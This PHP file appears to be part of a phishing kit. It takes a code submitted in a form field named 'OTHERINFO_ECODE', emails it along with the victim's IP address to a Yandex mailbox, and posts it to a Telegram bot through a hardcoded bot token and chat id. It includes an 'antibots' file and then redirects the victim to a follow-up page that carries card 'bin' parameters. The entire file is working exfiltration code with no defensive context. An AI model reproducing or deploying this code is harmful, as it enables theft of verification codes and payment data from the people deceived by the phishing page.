<?php
if(!isset($_SESSION)) { session_start(); }
include 'antibots.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "Return.php?bin=".$_GET['bin']."&binlist=".$_GET['binlist'];
$hostname = gethostbyaddr($ip);
$message .= "".$_POST['OTHERINFO_ECODE']."\n";
$send = "noctt@yandex.com";
$subject = "$ip";
$headers = "From:PI password<reality@superhosting.bg>";
mail($send,$subject,$message,$headers);
	$token = "5347410366:AAG4Y9rs4cvCASdkTYcSx3xl4PxQG9LXKL0";
$data = [
    'text' => $message,
    'chat_id' => '-706752114'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: $back");
?>